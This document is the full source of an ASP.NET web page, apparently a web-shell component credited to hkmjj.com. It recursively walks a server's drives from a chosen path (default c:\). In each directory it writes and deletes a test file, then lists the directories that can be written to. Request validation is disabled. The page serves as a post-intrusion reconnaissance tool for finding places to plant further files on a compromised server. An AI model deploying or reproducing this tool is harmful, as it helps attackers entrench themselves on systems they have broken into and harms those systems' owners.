<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>ScanWrtieable</title>
</head>
<body>

    <script runat="server">
    
        protected void Page_Load(object sender, EventArgs e)
        {
        }
        int cresults;
        protected void ScanRights(DirectoryInfo cdir)
        {
             try
             {
                 if (Int32.Parse(TextBox_stopat.Text) > 0)
                 {
                     if (cresults > Int32.Parse(TextBox_stopat.Text))
                         return;
                 }
                DirectoryInfo[] subdirs = cdir.GetDirectories();
                foreach (DirectoryInfo item in subdirs)
                {
                    ScanRights(item);
                }

                File.Create(cdir.FullName + "\\test").Close();
               
                    this.Lb_msg.Text += cdir.FullName+"<br/>";
                    cresults++;
                    File.Delete(cdir.FullName + "\\test");

             }

             catch { }
        }
        System.DateTime start = DateTime.Now;
        protected void ClearAllThread_Click(object sender, EventArgs e)
        {
            this.Lb_msg .Text= "";
            cresults = 0;
            ScanRights(new DirectoryInfo(Fport_TextBox.Text));
            TimeSpan usetime = System.DateTime.Now - start;
            this.Lb_msg.Text +="usetime: "+ usetime.TotalSeconds.ToString();
        }
        

    </script>

    <form id="form1" runat="server">
   
    <div>
         start<asp:TextBox ID="Fport_TextBox" runat="server" Text="c:\" Width="60px"></asp:TextBox>&nbsp;&nbsp; 
         Stopat <asp:TextBox ID="TextBox_stopat" runat="server" Text="5" Width="60px"></asp:TextBox>files
        <asp:Button ID="Button" runat="server" OnClick="ClearAllThread_Click" Text="ScanWriterable" /><br />
        <asp:Label ID="Lb_msg" runat="server" Text=""></asp:Label>
        <br />
        &nbsp;</div>
         <div>Code By <a href ="http://www.hkmjj.com">Www.hkmjj.Com</a></div>
    </form>
</body>
</html>
